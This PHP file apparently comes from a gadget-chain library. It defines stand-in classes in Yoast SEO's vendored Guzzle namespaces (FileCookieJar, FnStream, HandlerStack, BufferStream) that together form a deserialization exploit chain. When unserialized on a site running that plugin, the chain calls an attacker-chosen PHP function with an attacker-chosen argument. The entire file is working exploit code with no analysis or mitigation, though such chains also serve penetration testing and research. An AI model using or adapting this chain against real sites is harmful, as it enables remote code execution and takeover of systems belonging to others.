<?php
namespace YoastSEO_Vendor\GuzzleHttp {
  class HandlerStack {
    private $handler;
    private $stack;
    
    public function __construct($function, $parameter) {
      $this->handler = $parameter;
      $this->stack = [
        ["1"],
        ["set_exception_handler"],
        [
          [
            new \YoastSEO_Vendor\GuzzleHttp\Psr7\BufferStream,
            "__toString"
          ]
        ],
        [$function]
      ];
    }
  }
}

namespace YoastSEO_Vendor\GuzzleHttp\Psr7 {
  class FnStream {
    public $_fn___toString;
        
    public function __construct($function, $parameter) {
      $this->_fn___toString = [
        new \YoastSEO_Vendor\GuzzleHttp\HandlerStack($function, $parameter),
        "resolve"
      ];
    }
  }
  
  class BufferStream {
    private $buffer = 'is_int';
  }
}

namespace YoastSEO_Vendor\GuzzleHttp\Cookie {
  class FileCookieJar {
    private $filename;

    public function __construct($function, $parameter) {
      $this->filename = new \YoastSEO_Vendor\GuzzleHttp\Psr7\FnStream($function, $parameter);
    }
  }
}